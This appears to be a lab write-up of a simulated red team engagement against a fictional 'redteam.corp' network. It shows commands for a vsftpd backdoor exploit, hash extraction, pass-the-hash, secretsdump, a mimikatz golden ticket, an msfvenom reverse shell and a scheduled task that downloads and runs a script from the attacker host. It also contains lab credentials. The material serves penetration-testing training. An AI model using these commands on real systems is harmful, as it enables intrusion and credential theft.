# Red Team Engagement Simulation
A Red Team Engagement is a cybersecurity exercise designed to simulate real-world attacks and security breaches on an organization's systems, networks, and applications. The primary goal of a red team engagement is to identify vulnerabilities, weaknesses, and potential points of exploitation within an organization's defenses.

### **Initial Access: SCOPE of Engagement :**

## **[172.16.25.0/24](http://172.16.25.0/24) [ONLY 172.16.25.1 is out of scope]**

### Objective:

1. To pivot through a network by compromising a public facing web machine and tunnelling our traffic to access other machines in the network.
2. To reach the highest (**root/administrator**) level command execution.
3. To compromise the Child and Parent Domain

## My Attacker IP Address: 172.16.250.4

# Enumeration

Enumerating the given IP Ranges

```bash
nmap -sn 172.16.25.0/24 > ./Findings/nmap_172-16-25-0_24.txt
```

And resulted me to 3 IP Addresses

![Screenshot 2023-07-08 at 9 48 01 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/1c814cb3-de1a-40ff-8c80-d9fe62e0d829)

### Network Details

| External IP Address | Remarks | Description |
| --- | --- | --- |
| 172.16.25.1 | Out of Scope |  |
| 172.16.25.2 | 22 open ports | Production-Server |
| 172.16.25.3 | 4 open ports (with no port 80), but with RDP port open | child.redteam.corp/Employee-System |

Enumerating 172.16.25.2 using nmap scan, and had 22 open ports

```bash
nmap -A -sV -sT 172.16.25.3 > ./Findings/nmap_172-16-25-3.txt
```
## 172.16.25.2

![Screenshot 2023-07-08 at 10 02 27 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/fe4dd490-0658-4355-8403-08f546cc2f34)
![Screenshot 2023-07-08 at 10 08 45 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/4c4551c8-519e-4869-ab52-0d5f99820661)
![Screenshot 2023-07-08 at 10 09 23 AM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/a2053f05-b7b3-47bd-a1b5-d825adb2f1b0)

## 172.16.25.3

```bash
nmap -A -sV -sT 172.16.25.3 > ./Findings/nmap_172-16-25-3.txt
```

We found 4 open ports and validates that this is windows machine where port 3389 
![Screenshot 2023-07-08 at 10 04 54 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/7d0f1ee4-c0da-4bac-bfe2-92f8661fc69d)

I will get back to this later, while I proceed on IP 172.16.25.2

## port 80 at 172.16.25.2

since port 80 is open, I look at http://172.16.25.2, a Registration page for Red Team Lab

![Screenshot 2023-06-28 at 9 32 04 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/671daaca-c974-4258-a7ae-257fbd4f1307)

I tried the registration but it give us an error 

![Screenshot 2023-06-28 at 10 13 38 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/344afbb0-1575-43d3-ae7b-6ee68400c194)

![Screenshot 2023-07-08 at 10 13 21 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/91e3e2ad-abd0-440f-9218-5d61302bcc68)

error after the registration

## vsftpd 2.3.4

Since I couldn’t get any information on port 80, I moved to the service running on port 21 which I believed vsftpd 2.3.4 has vulnerability.
![Screenshot 2023-07-08 at 10 14 41 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/725b9bde-e9bc-4b4f-b502-c931fad37585)

| Vulnerability | System | CVSS Version 3.x | CVSS version 2.0 |
| --- | --- | --- | --- |
| CVE-2011-2523 vsftpd 2.3.4 | 172.16.25.2 | 9.8 Critical | 10.0 High |

Using metasploit, We look on possible use of the  vsftpd 2.3.4 service vulnerability.

![Screenshot 2023-07-08 at 12 23 21 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/dd0ebfc7-2a0f-45c7-bb2b-87bf7d892530)

I found an exploit for vsftpd 2.3.4 which is a Backdoor Command Execution and can be used to the target machine. Selecting the module - exploit/unix/ftp/vsftpd_234_backdoor, and the setting up the following:

RHOSTS: 172.16.25.2

verbose: True

![Screenshot 2023-07-08 at 12 32 16 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/85d66a19-cd8e-4bdf-878c-2ca84995d926)
![Screenshot 2023-07-08 at 12 34 13 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/12289f49-0fef-4bfb-b606-8c930d4849ae)

Executing the exploit and a shell session was created, but this is not a interactive shell
![Screenshot 2023-07-08 at 12 35 08 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/e90ebfff-f2db-4298-af96-4ab0ca80cef6)

To have a interactive shell, I execute a terminal (tty) spawned via Python

```bash
python -c "import pty;pty.spawn('bin/bash')"
```

I got a root shell under the host-name Production-Server

## Production-Server
![Screenshot 2023-06-28 at 10 26 54 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/97d6cd96-e1cf-40ea-bbd1-7f6b50188946)

we got a root shell of Production-Server

From here I checked the /etc/passwd to check some interesting credentials

```bash
cat /etc/passwd
```
![Screenshot 2023-07-08 at 12 40 06 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/20e0ba04-b946-4db0-b5d4-e728f6129ff4)


I found a a familiar credential

```bash
msfadmin:x:1000:1000:msfadmin,,,:/home/msfadmin:/bin/bash
```

I look around to gather more interesting information. I found another user named “prod-admin”.

![Screenshot 2023-07-08 at 12 46 22 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/70ab05d3-f736-4627-89f7-e0faa4aa9423)


## prod-admin

I navigate to home root directory and found 5 users folders. And look to the prod-admin folder and found a file named “credential.txt”

![Screenshot 2023-07-08 at 12 48 49 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/6ee39fc7-9280-4af2-add2-2487c8519ab9)

```bash
cd prod-admin
ls
cat credential.txt
```
![Screenshot 2023-07-08 at 12 49 43 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/90889d99-bbe2-4146-ab62-676c30f779da)

2 interesting credentials

| User Name | Password |
| --- | --- |
| support | support@123 |
| prod-admin | Pr0d!@#$% |

First, I try to login using the 1st credential - support:support@123. It doesn’t work

```bash
ssh support@172.16.25.2
```

![Screenshot 2023-07-08 at 12 56 23 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/ef1d2b75-0691-4725-968a-80de57760c7c)

Next, I go with trying the 2nd credential - prod-admin:Pr0d!@#$%. It does work

```bash
ssh prod-admin@172.16.25.2
```
![Screenshot 2023-07-08 at 12 59 25 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/a9a7faf2-a6df-4f50-b16e-dece94b8ce59)

So far this is the summary of what I got from the root directory enumeration of the Production-Server.

| User’s Directory | Remarks |  |
| --- | --- | --- |
| ftp | nothing interesting |  |
| msfadmin | nothing interesting |  |
| prod-admin | found credential.txt | Support User Credential = support:support@123 and Prod-admin Credential = prod-admin:Pr0d!@#$% |
| service | nothing interesting |  |
| user | nothing interesting |  |

# Pivoting

## IP 10.10.10.5 : Production-Server

Moving on, I conduct an initial enumeration inside the compromised Production-Server

Run a network card enumeration and found its internal ip address. Do a ping test on it and it is active.

![Screenshot 2023-07-08 at 1 03 52 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/891ac41e-7f77-4887-aac0-243500fb2672)

Surprisingly nmap is working on the production server, I scanned the network to look for an ip range

```bash
nmap -sN 10.10.10.0/24
```
![Screenshot 2023-07-08 at 1 37 10 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/203038b8-7161-4a07-8640-1ee752993205)

![Screenshot 2023-07-08 at 1 37 33 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/7dfe5c22-bbcb-4615-b574-81ad19409c40)

Found an IP range 10.10.10.1, 10.10.10.2, 10.10.10.3 and 10.10.10.4

### Network Details

| External IP Address | Description |
| --- | --- |
| 172.16.25.1 | Out of Scope |
| 172.16.25.2 | Production-Server |
| 172.16.25.3 | child.redteam.corp/Employee-System |
| Internal IP Address | Description |
| 10.10.10.1 | Reserved IP of the network |
| 10.10.10.2 | we suspect this as the Domain Controller |
| 10.10.10.3 | unknown |
| 10.10.10.4 | unknown |
| 10.10.10.5 | The compromised Production-Server (Ubuntu 8.04) |

From our gathered IP ranges we moved on our first target which is 10.10.10.3

## IP 10.10.10.3

With the compromised Production-Server, I setup my proxychains at 1080 to be able to run commands directly from my machine without touching the Production-Server.

![Screenshot 2023-07-09 at 8 32 11 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/2c72a5df-cf4c-4a84-be4b-74b13ba76e62)

I run an nmap scan to 10.10.10.3 to find an open ports to attack with.

```bash
proxychains nmap -sV 10.10.10.3
```

![Screenshot 2023-07-09 at 7 51 11 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/3df08f03-cf8c-4f93-9825-773fcaf738b5)

Again I run some nmap scan to it

```bash
proxychains nmap -sC -A 10.10.10.3
```
![Screenshot 2023-07-09 at 8 00 12 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/7598a7ae-6ae0-4bfb-a90c-a42df934ee03)

Found 4 open ports with 2 high ports in it. Based on the protocol assigned to this 2 open ports, looks like these are web applications.

| Port | Description | Exploit |
| --- | --- | --- |
| 9090 | http / web application / Cockpit web service 162 - 188 | found some article related to its exploit |
| 10000 | http / web application / MiniServ 1.953 (Webmin httpd) | Unable to find any exploit on this version |

Before accessing these I setup a new proxy in firefox foxyproxy for port 1080

![Screenshot 2023-07-09 at 7 54 27 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/44e0e34f-1896-4f46-9cde-fafd99685e5d)

I will check what’s on these ports by navigating through the following urls:

```bash
http://10.10.10.3:9090
http://10.10.10.4.10000
```
![Screenshot 2023-07-09 at 7 58 49 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/ae327810-17cb-4730-9d9d-290bdadbf33b)

I found out that this url https://10.10.10.3:9090 is a server named Admin-System.

### Network Details

| External IP Address | Description |
| --- | --- |
| 172.16.25.1 | Out of Scope |
| 172.16.25.2 | Production-Server |
| 172.16.25.3 | child.redteam.corp/Employee-System |
| Internal IP Address | Description |
| 10.10.10.1 | Reserved IP of the network |
| 10.10.10.2 | we suspect this as the Domain Controller |
| 10.10.10.3 | Admin-System |
| 10.10.10.4 | unknown |
| 10.10.10.5 | The compromised Production-Server (Ubuntu 8.04) |

![Screenshot 2023-07-09 at 7 58 37 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/ed04f7d4-3fe9-43b5-9d33-0b7523e7771f)

Both web services are running with TLS

| IP URLs | Web Applications |
| --- | --- |
| https://10.10.10.3:9090 | Cockpit web service 162 - 188 |
| https://10.10.10.3:10000 | MiniServ 1.953 (Webmin httpd) |

I run several login attempts on both the web, the only credentials that works is the support user’s credentials I found from credential.txt.

| UserID | Password |
| --- | --- |
| support | support@123 |

I used these credentials and I was able to login to the Cockpit Web Service.

![Screenshot 2023-07-08 at 3 52 15 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/46c225c6-8976-4626-95fc-e2b106d515b9)


Navigating to through the web application, I found a terminal tab

## Admin-System

Do some enumeration on this machine

![Screenshot 2023-07-09 at 9 01 55 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/7d38835c-3087-4f76-a9c1-5249ce04c22e)

Looking into the terminal and execute some commands. I found out some interesting files inside the home directory of admin-sys. Interestingly I found a child-admin.keytab. From my research, A keytab is a file containing pairs of Kerberos principals and encrypted keys that are derived from the Kerberos password. You can use this file to log on to Kerberos without being prompted for a password.

![Screenshot 2023-07-09 at 9 03 57 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/e908bce3-3b32-4af4-b7d6-0fc1c3308085)

Back to the terminal and try to look for some interesting files.

## krb5.keytab

Using the klist tool, found lots of entries **in the local credentials cache and key table.**

```bash
klist -k /etc/krb5.keytab
```
![Screenshot 2023-07-08 at 4 29 24 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/442bc25d-999d-4b8e-b4e3-fbc098255569)

Found 2 interesting credentials:

| Credentials |
| --- |
| administrator@CHILD.REDTEAM.CORP |
| Admin-System@CHILD.REDTEAM.CORP |

![Screenshot 2023-07-08 at 4 30 05 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/5f42b942-0721-497e-93e0-18bc07617291)

Back to our admin-sys directory, I was able to get to root access.

![Screenshot 2023-07-09 at 9 12 11 AM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/06dc119b-50aa-4693-87b9-65a79a6700d9)

From my research, I can able to read the content of the child-admin.keytab using the tool KeyTabExtract.py. This means we need to download this keytab file.

## child-admin.keytab

```bash
scp child-admin.keytab USER@172.16.250.4:child-admin.keytab
```
![Screenshot 2023-07-09 at 9 54 22 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/c92808b4-e0a1-4701-bbbc-37a88e94c680)

## KeyTabExtract.py

KeyTabExtract is a little utility to help extract valuable information from 502 type .keytab files, which may be used to authenticate Linux boxes to Kerberos. The script will extract information such as the realm, Service Principal, Encryption Type and NTLM Hash.

![Screenshot 2023-07-08 at 5 35 41 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/7a04ef7e-6661-4d39-87c6-14d6eae11fbb)

## child-admin NTLM HASH

Nice I had the child-admin NTLM HASH, we can possibly use this to login to our machines or extract information from other domain users.

```bash
NTML HASH: dbac2b57a73bb883422658d2aea36967
```

# Lateral Movement

## crackmapexec

Using CrackMapExec I will try to check if I can can collect Active Directory information to conduct lateral movement through the network. Since I assumes that 10.10.10.2 is possible domain controller IP, I execute the crackmapexec to it

```bash
proxychains poetry run crackmapexec smb 10.10.10.2 -u 'child-admin' -H :dbac2b57a73bb883422658d2aea36967
```

## child.redteam.corp\child-admin

Nice, I got the Pwn3d! and found out that 10.10.10.2 is the domain controller named RED-CHILDDC running on Windows Server 2016 Standard 14393 x64.

![Screenshot 2023-07-08 at 7 58 29 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/03027ab0-7090-41a3-8b81-df52f0c996e7)

| External IP Address | Description |
| --- | --- |
| 172.16.25.1 | Out of Scope |
| 172.16.25.2 | Production-Server |
| 172.16.25.3 | child.redteam.corp/EMPLOYEE-SYSTEM |
| Internal IP Address | Description |
| 10.10.10.1 | Reserved IP of the network |
| 10.10.10.2 | RED-CHILDDC |
| 10.10.10.3 | ADMIN-SYSTEM |
| 10.10.10.4 | unknown |
| 10.10.10.5 | The compromised Production-Server (Ubuntu 8.04) |

## psexec.py

Using the psexec.py, the child-admin hash and with our active proxy running on 1080. I will login to the Domain Controller IP address through the child-admin user.

```bash
proxychains psexec.py child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
```
![Screenshot 2023-07-08 at 8 07 11 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/79cdd815-38a6-439e-b2d1-6923dedab8bf)

There, I got successfully accessed it. 

```bash
net user /domain
```

Enumerating more further on the machine, I can see more domain users.

![Screenshot 2023-07-08 at 8 59 30 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/a30ecf73-6965-4f22-a78f-4f7effbccf33)

# Moving to DC

## secretsdump.py

To look more information on my target domain controller, I will use the secretsdump.py to extract **credentials and secrets from a system.**

```bash
proxychains secretsdump.py child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
```
![Screenshot 2023-07-08 at 8 23 21 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/0eff594b-d649-4bfe-a7d4-975ac5c58046)

Great, I got the Administrator credential and other more machine part of this domain.

Also I got the krbtgt credentials as well.

![Screenshot 2023-07-08 at 8 28 08 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/1ba1af26-971f-4e81-941a-09c95a807650)

## secretsdump.py -debug

Even more information I gathered using the -debug switch

```bash
proxychains secretsdump.py -debug child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
```
![Screenshot 2023-07-08 at 8 33 03 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/28e5d660-16b1-4491-8832-a12dabf62ff9)
![Screenshot 2023-07-08 at 8 33 23 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/aebe1d64-4d6f-4543-aca8-da975d3431c9)
![Screenshot 2023-07-08 at 8 33 46 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/53a0f654-aa77-4459-acea-137fff5265a4)
![Screenshot 2023-07-08 at 8 34 51 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/31c97561-e9bf-4b7a-a3f5-d4d787e88423)
![Screenshot 2023-07-08 at 8 35 44 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/5d006205-26cb-495b-b7a2-b60e6bf1ec01)
![Screenshot 2023-07-08 at 8 36 17 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/93904dd9-550e-4468-8f76-5d20cf148f9d)
![Screenshot 2023-07-08 at 8 37 06 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/faf5528a-4cd5-48b8-9a2e-7a57bd22223d)
![Screenshot 2023-07-08 at 8 37 52 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/1702a323-aff8-420e-8bb9-edadb97f5995)

Moving further to our enumeration, I will use the windows/shell_reverse_tcp and incognito.exe to spawn a reverse shell from our attacking machine.

## windows/shell_reverse_tcp - binary-jupin.exe and incognito.exe

Creating my reverse shell using msfvenom and send it to the compromised child-admin machine along with the incognito.exe

```bash
sudo msfvenom --platform windows -p windows/shell_reverse_tcp LHOST=172.16.250.4 LPORT=443 -f exe -o binary-jupin.exe
```
![Screenshot 2023-07-08 at 8 55 06 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/59223b00-1078-4f6d-8bd5-a4354217ae0c)
![Screenshot 2023-07-08 at 10 02 49 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/5031d2b5-5975-4b3c-8781-8c7d7be8bcc1)

Execute the incognito.exe and my crafted reverse shell.

```bash
incognito.exe execute -c "child.redteam.corp\child-admin" C:\Users\Public\binary-jupin.exe
```

I got the shell listening on port 443 which I setup in my crafted reverse shell.

![Screenshot 2023-07-08 at 9 05 07 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/16306778-4cb4-4ad6-984d-80149a23c0c0)

Initiate enumeration on the spawned shell at port 443 and did get the same domain users information.

```bash
net user /domain
```
![Screenshot 2023-07-08 at 9 08 09 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/fe82d5ed-5a5b-4953-aa57-b7aab73a347f)

## mimikatz.exe

Now I will be using the mimikatz tool to extract more information connected to our compromised child-admin machine. Sending this to our compromised machine.

![Screenshot 2023-07-08 at 9 13 55 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/78c319e9-b7d9-4af6-8ff6-df3d403f8286)
![Screenshot 2023-07-08 at 9 14 06 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/12c6236f-600c-4ee7-a91d-9f30242e5d6f)


Executes a mimikatz session. From the output, I only did get the SID of the child-admin and the NTLM Hash of RED-CHILDDC

![Screenshot 2023-07-09 at 11 27 17 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/5d90fe69-aee4-49bc-9ce0-f67cfcc238e2)

## child-admin SID

![Screenshot 2023-07-08 at 9 23 18 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/79ddadcd-25a0-4079-bba7-a75de29a4139)

There is something missing in my enumeration approach. I forgot to use the powershell scripts.

## PowerView-Dev.ps1

Sending the copy of PowerView-Dev.ps1 to the compromised Domain Controller.

![Screenshot 2023-07-08 at 9 33 14 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/cd63f4c3-8882-455b-bcfb-2f655d57398c)
![Screenshot 2023-07-08 at 9 33 02 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/af5137c3-7eb1-472b-b9d3-08810777ec3d)

Initiating the powershell and do the bypass

```bash
powershell -ep bypass
Get-Netcomputer | Select-Object cn
```

Found 4 machines connected to the domain controller.

![Screenshot 2023-07-08 at 9 40 08 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/aaee5b8e-c061-4db2-9818-0b698f015f82)

Back to mimikatz again. Using the SID of the child-admin and NTLM of the krbtgt, I will be forging my golden ticket to be able to access the domain controller fully.

## Golden Ticket

```bash
kerberos::golden /User:Administrator /domain:child.redteam.corp /sid:S-1-5-21-2332039752-785340267-2377082902-500 /krbtgt:24dd6646fd7e11b60b6a9508e6fe7e5a startoffset:0 /endin:600 /renewmax:10080 /ptt
```
![Screenshot 2023-07-09 at 11 15 33 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/388f0904-3ee2-4b27-817c-e7c8b4393566)

Exiting from mimikatz, from here we know that our golden ticket is temporarily saved in the machine’s memory.

Moving on, initiate an enquiry if I can see the domain controller c$ directory.

```bash
PS > dir \\RED-CHILDDC.child.redteam.corp\c$
```

Great, this is the one I missed - “\\RED_CHILDDC.child.redteam.corp”

![Screenshot 2023-07-08 at 10 19 09 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/d8004b97-4217-4e4b-907e-fc859b9335f6)

Now we are creating a powershell TCP that would connect back to our attacking machine on port 4444.

## Invoke-PowerShellTcpOneLine.ps1

![Screenshot 2023-07-08 at 10 28 08 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/12f28ff0-e0ab-4c1b-9a4a-f43d395c0952)

With all the information we gathered. From the compromised child-admin system, we schedule a task that will run on the domain controller. This task will initiate a download script of the copy of the Invoke-PowerShellTcpOneLine.ps1 running in our listener at port 80 of our attacking machine. The powershell script will spawn a shell on our attacking machine listening on port 4444.

```bash
schtasks /create /S RED-CHILDDC.child.redteam.corp /SC Weekly /RU "NT Authority\SYSTEM" /TN "silver1" /TR
"powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.250.4:4444/Invoke-PowerShellTcpOneLine.ps1''')'"
```

The schedule task is successful with task name “silver1”

![Screenshot 2023-07-08 at 10 40 10 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/c517f50e-50ec-49ec-abb9-be388af02941)

```bash
#this will transfer the Invoke-PowerShellTcpOneLine.ps1
sudo python3 -m http.server 80

#this is where the reverse shell will spawn at port 4444
sudo nc -lnvp 4444

#this will execute the schedule task "recent3"
schtasks /Run /S windows-sevrer.warfare.corp /TN "silver1"
```

Listening at port 80 where our Invoke-PowerShellTcpOneLine.ps1 is stored

![Screenshot 2023-07-08 at 10 43 10 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/75756982-21e2-4031-9fd7-6a4c1941e97a)

Initiating the task from the child-admin machine.

```bash
schtasks /Run /S RED-CILDDC.child.redteam.corp /TN "silver1"
```

Task is successful

![Screenshot 2023-07-08 at 10 43 26 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/f0aead82-bd59-4782-97e7-0fe617e1704f)

In our listening port 4444, a shell has been spawned. Do the enumeration and we validated that this spawned shell is the domain controller itself running on IP address 10.10.10.2 with the hostname RED-CHILDDC

![Screenshot 2023-07-08 at 10 44 01 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/bc1e0e2e-201e-4502-955e-b59236b9511e)

Now we completed our enumeration as follows.

| External IP Address | Description |
| --- | --- |
| 172.16.25.1 | Out of Scope |
| 172.16.25.2 | Production-Server |
| 172.16.25.3 | child.redteam.corp/EMPLOYEE-SYSTEM |
| Internal IP Address | Description |
| 10.10.10.1 | Reserved IP of the network |
| 10.10.10.2 | RED-CHILDDC |
| 10.10.10.3 | ADMIN-SYSTEM |
| 10.10.10.4 | DATABASE-SERVER |
| 10.10.10.5 | The compromised Production-Server (Ubuntu 8.04) |

# Conclusion

The red team engagement has shown that an external attacker can gain an initial foothold to the network by exploiting the public facing server (172.16.25.2). From there an attacker can compromise the entire network.

# Mitigation

1. Mitigating vulnerabilities and addressing outdated system patches is crucial to maintaining a secure environment. Remember that vulnerabilities are a common part of the IT landscape, but proactive and effective management can significantly reduce the risk they pose. Regularly review and adapt your mitigation strategies based on changes in your environment, emerging threats, and new technologies. On this case, the Production-Server [172.16.25.2]

| Vulnerability | System | CVSS Version 3.x | CVSS version 2.0 |
| --- | --- | --- | --- |
| CVE-2011-2523 vsftpd 2.3.4 | 172.16.25.2 | 9.8 Critical | 10.0 High |

2. Hardening Windows defenses against tools like Mimikatz and techniques associated with LOLBAS (Living Off The Land Binaries and Scripts) is crucial for improving the security of the systems. These tools and techniques are often used by attackers to compromise systems and gain unauthorized access to sensitive information.
